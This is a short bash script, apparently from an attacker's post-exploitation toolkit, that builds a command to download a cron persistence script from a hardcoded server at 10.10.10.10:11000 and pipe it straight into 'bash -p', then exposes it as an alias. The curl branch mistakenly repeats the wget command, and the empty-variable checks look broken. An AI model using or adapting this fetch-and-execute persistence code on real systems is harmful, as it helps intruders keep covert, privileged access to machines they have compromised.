#!/bin/bash

FALSE=$(/bin/false)
SERVER_IP="10.10.10.10"
SERVER_HTTP_PORT="11000"

HAS_WGET=""
HAS_CURL=""

if [[ "$HAS_WGET" != "$FALSE" ]];
then
    persistence_cron_setup="wget -qO- http://$SERVER_IP:$SERVER_HTTP_PORT/preload/scripts/persistence/cron/setup.sh | bash -p"

elif [[ "$HAS_CURL" != "$FALSE" ]];
then
    persistence_cron_setup="wget -qO- http://$SERVER_IP:$SERVER_HTTP_PORT/preload/scripts/persistence/cron/setup.sh | bash -p"
fi

alias PERSISTENCE_CRON_SETUP="$persistence_cron_setup"
